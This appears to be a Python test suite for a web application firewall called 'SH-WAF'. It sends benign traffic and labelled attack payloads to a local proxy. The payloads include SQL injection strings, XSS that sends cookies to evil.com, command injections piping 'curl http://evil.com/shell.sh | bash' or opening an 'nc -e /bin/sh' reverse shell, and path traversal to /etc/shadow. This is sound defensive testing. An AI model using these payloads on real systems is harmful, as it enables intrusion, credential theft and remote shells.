"""
SH-WAF - Complete Attack Test Suite
=====================================
Run proxy first:  python waf_proxy.py
Then run this:    python test_all_attacks.py

Tests all attack types and normal traffic against the live WAF proxy.
Watch results in real-time on your dashboard at http://localhost:5173
"""

import requests
import time
import sys
from urllib.parse import quote

BASE = "http://localhost:8080"

RESET  = "\033[0m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
WHITE  = "\033[97m"
GRAY   = "\033[90m"

def send(method, path, params=None, data=None, headers=None, label="", expected_blocked=True):
    url = f"{BASE}{path}"
    try:
        if method == "GET":
            r = requests.get(url, params=params, headers=headers or {}, timeout=5)
        elif method == "POST":
            r = requests.post(url, params=params, data=data, headers=headers or {}, timeout=5)
        else:
            r = requests.request(method, url, params=params, data=data, timeout=5)

        body = r.json() if r.headers.get("Content-Type","").startswith("application/json") else {}
        blocked  = body.get("blocked", False)
        ai_score = body.get("ai_score", 0)
        atk_type = body.get("attack_type", "Normal")

        if blocked:
            status_str = f"{RED}BLOCKED{RESET}"
        else:
            status_str = f"{GREEN}ALLOWED{RESET}"

        score_color = RED if ai_score > 0.7 else YELLOW if ai_score > 0.4 else GREEN
        print(f"  {status_str:20s} {score_color}score={ai_score:.2f}{RESET}  {GRAY}{label}{RESET}")
        return blocked

    except requests.exceptions.ConnectionError:
        print(f"  {RED}CONNECTION ERROR{RESET} - Is waf_proxy.py running? (python waf_proxy.py)")
        sys.exit(1)
    except Exception as e:
        print(f"  {RED}ERROR{RESET}: {e}")
        return False


def section(title, color=CYAN):
    print(f"\n{color}{BOLD}{'='*60}{RESET}")
    print(f"{color}{BOLD}  {title}{RESET}")
    print(f"{color}{BOLD}{'='*60}{RESET}")


def run_tests():
    print(f"""
{BOLD}{WHITE}
  ███████╗██╗  ██╗      ██╗    ██╗ █████╗ ███████╗
  ██╔════╝██║  ██║      ██║    ██║██╔══██╗██╔════╝
  ███████╗███████║█████╗██║ █╗ ██║███████║█████╗
  ╚════██║██╔══██║╚════╝██║███╗██║██╔══██║██╔══╝
  ███████║██║  ██║      ╚███╔███╔╝██║  ██║██║
  ╚══════╝╚═╝  ╚═╝       ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝
  Attack Test Suite — All Vectors
{RESET}""")

    # ── 1. NORMAL TRAFFIC ────────────────────────────────────────
    section("1. NORMAL TRAFFIC (Should be ALLOWED)", GREEN)
    normal_tests = [
        ("GET",  "/",                    None,                         "Homepage"),
        ("GET",  "/about",               None,                         "About page"),
        ("GET",  "/api/products",        {"page": "1", "limit": "10"}, "Products list"),
        ("GET",  "/api/users/me",        None,                         "User profile"),
        ("GET",  "/search",              {"q": "hello world"},         "Normal search"),
        ("GET",  "/blog",                {"id": "42"},                 "Blog post"),
        ("POST", "/api/login",           None, {"email": "user@test.com", "password": "pass123"}, "Login"),
        ("POST", "/api/contact",         None, {"name": "John", "msg": "Hello there"}, "Contact form"),
        ("GET",  "/products",            {"category": "electronics"},  "Product filter"),
        ("GET",  "/api/health",          None,                         "Health check"),
    ]
    blocked_count = 0
    for test in normal_tests:
        if len(test) == 4:
            method, path, params, label = test
            data = None
        else:
            method, path, params, data, label = test
        blocked = send(method, path, params=params, data=data, label=label, expected_blocked=False)
        if blocked:
            blocked_count += 1
        time.sleep(0.3)
    print(f"\n  {GRAY}Normal traffic blocked: {blocked_count}/{len(normal_tests)}{RESET}")

    # ── 2. SQL INJECTION ─────────────────────────────────────────
    section("2. SQL INJECTION ATTACKS (Should be BLOCKED)", RED)
    sqli_tests = [
        ("/login",   {"id":  "1' OR '1'='1"},                     "Classic OR bypass"),
        ("/login",   {"user": "admin'--"},                        "Comment injection"),
        ("/search",  {"q":  "' UNION SELECT * FROM users--"},     "UNION SELECT"),
        ("/search",  {"q":  "' UNION SELECT username,password FROM users--"}, "UNION credential dump"),
        ("/api/user",{"id": "1; DROP TABLE users;--"},            "DROP TABLE"),
        ("/products",{"id": "1 AND SLEEP(5)"},                    "Time-based blind SQLi"),
        ("/api/data",{"q":  "1' AND 1=CONVERT(int,@@version)--"}, "Error-based SQLi"),
        ("/login",   {"pass":"' OR 1=1--"},                       "Password bypass"),
        ("/filter",  {"cat":"' OR 'x'='x"},                       "String comparison bypass"),
        ("/api/get", {"id": "1 UNION ALL SELECT NULL,NULL,NULL--"},"UNION NULL probe"),
        ("/search",  {"q":  "'; INSERT INTO users VALUES('hacker','pwned')--"}, "INSERT injection"),
        ("/data",    {"f":  "1' HAVING 1=1--"},                   "HAVING clause injection"),
    ]
    for path, params, label in sqli_tests:
        send("GET", path, params=params, label=label)
        time.sleep(0.3)

    # ── 3. XSS ATTACKS ───────────────────────────────────────────
    section("3. CROSS-SITE SCRIPTING / XSS (Should be BLOCKED)", RED)
    xss_tests = [
        ("/comment", {"text": "<script>alert('XSS')</script>"},              "Basic script tag"),
        ("/profile", {"name": "<img src=x onerror=alert(document.cookie)>"}, "Img onerror"),
        ("/search",  {"q":    "<svg onload=alert(1)>"},                       "SVG onload"),
        ("/bio",     {"data": "javascript:alert(1)"},                         "javascript: URI"),
        ("/post",    {"body": "<iframe src='javascript:alert(1)'></iframe>"},  "Iframe injection"),
        ("/user",    {"info": "<body onload=alert('xss')>"},                   "Body onload"),
        ("/page",    {"h":    "<h1 onmouseover='alert(1)'>Hover me</h1>"},    "Mouseover event"),
        ("/msg",     {"t":    "';alert(String.fromCharCode(88,83,83))//"},     "String.fromCharCode"),
        ("/data",    {"v":    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}, "Cookie steal"),
        ("/input",   {"x":    "<details open ontoggle=alert(1)>"},             "HTML5 ontoggle"),
        ("/search",  {"q":    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"},         "URL encoded XSS"),
        ("/view",    {"id":   "<script src='http://evil.com/xss.js'></script>"},"External script"),
    ]
    for path, params, label in xss_tests:
        send("GET", path, params=params, label=label)
        time.sleep(0.3)

    # ── 4. COMMAND INJECTION ──────────────────────────────────────
    section("4. COMMAND INJECTION ATTACKS (Should be BLOCKED)", RED)
    cmdi_tests = [
        ("/ping",    {"host": "google.com; whoami"},               "Semicolon chain"),
        ("/ping",    {"host": "google.com && cat /etc/passwd"},    "AND chain"),
        ("/exec",    {"cmd":  "| ls -la /"},                       "Pipe to ls"),
        ("/run",     {"input":"`id`"},                             "Backtick execution"),
        ("/api/run", {"cmd":  "$(cat /etc/shadow)"},               "Dollar substitution"),
        ("/scan",    {"ip":   "127.0.0.1; curl http://evil.com/shell.sh | bash"}, "Curl pipe bash"),
        ("/check",   {"url":  "http://localhost | wget http://evil.com"}, "Wget download"),
        ("/tools",   {"q":    "test; python -c 'import os;os.system(\"id\")'"},   "Python exec"),
        ("/api/ping",{"h":    "8.8.8.8 & nc -e /bin/sh evil.com 4444"},           "Netcat reverse shell"),
        ("/lookup",  {"name": "google.com; perl -e 'system(\"id\")'"}, "Perl execution"),
    ]
    for path, params, label in cmdi_tests:
        send("GET", path, params=params, label=label)
        time.sleep(0.3)

    # ── 5. PATH TRAVERSAL ─────────────────────────────────────────
    section("5. PATH TRAVERSAL ATTACKS (Should be BLOCKED)", RED)
    path_tests = [
        ("/file",     {"path": "../../../../etc/passwd"},             "Unix passwd file"),
        ("/download", {"f":    "../../../etc/shadow"},                "Shadow file"),
        ("/read",     {"name": "..\\..\\..\\windows\\system32\\sam"}, "Windows SAM"),
        ("/view",     {"doc":  "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},    "Double URL encoded"),
        ("/static",   {"file": "....//....//etc/passwd"},             "Double dot slash"),
        ("/img",      {"src":  "%252e%252e%252fpasswd"},              "Double encoding"),
        ("/api/file", {"p":    "/etc/hosts"},                         "Absolute path"),
        ("/load",     {"res":  "../../proc/self/environ"},            "Process environ"),
        ("/fetch",    {"url":  "file:///etc/passwd"},                 "file:// protocol"),
        ("/get",      {"path": "....\\....\\etc\\passwd"},            "Windows traversal"),
    ]
    for path, params, label in path_tests:
        send("GET", path, params=params, label=label)
        time.sleep(0.3)

    # ── 6. POST BODY ATTACKS ──────────────────────────────────────
    section("6. POST BODY INJECTION (Should be BLOCKED)", RED)
    post_tests = [
        ("/api/login",  {"Content-Type":"application/x-www-form-urlencoded"},
         "username=admin'--&password=anything",                    "POST SQLi login"),
        ("/api/comment",{"Content-Type":"application/x-www-form-urlencoded"},
         "comment=<script>alert(document.cookie)</script>",        "POST XSS comment"),
        ("/api/search", {"Content-Type":"application/x-www-form-urlencoded"},
         "q=' UNION SELECT username,password FROM users--",        "POST UNION inject"),
        ("/api/upload", {"Content-Type":"application/x-www-form-urlencoded"},
         "filename=../../etc/passwd",                               "POST path traversal"),
        ("/api/exec",   {"Content-Type":"application/x-www-form-urlencoded"},
         "cmd=;cat /etc/passwd",                                    "POST command inject"),
    ]
    for path, headers, data, label in post_tests:
        send("POST", path, data=data, headers=headers, label=label)
        time.sleep(0.3)

    # ── 7. USER-AGENT ATTACKS ─────────────────────────────────────
    section("7. SCANNER / BOT USER-AGENTS", YELLOW)
    ua_tests = [
        ("sqlmap/1.7.8#stable (https://sqlmap.org)",          "SQLmap scanner"),
        ("Nikto/2.1.6",                                        "Nikto web scanner"),
        ("Mozilla/5.0 (compatible; Googlebot/2.1)",            "Googlebot (allowed)"),
        ("python-requests/2.28.0",                             "Python requests"),
        ("masscan/1.0",                                        "Masscan port scanner"),
    ]
    for ua, label in ua_tests:
        send("GET", "/api/data", headers={"User-Agent": ua}, label=f"UA: {label}")
        time.sleep(0.3)

    # ── SUMMARY ───────────────────────────────────────────────────
    print(f"""
{BOLD}{CYAN}{'='*60}
  All tests complete!
  Check your SH-WAF Dashboard:
  -> http://localhost:5173/dashboard    (stats)
  -> http://localhost:5173/logs         (attack logs)
  -> http://localhost:5173/traffic      (live traffic)
  -> http://localhost:5173/anomaly      (AI detection)
{'='*60}{RESET}
""")


if __name__ == "__main__":
    run_tests()
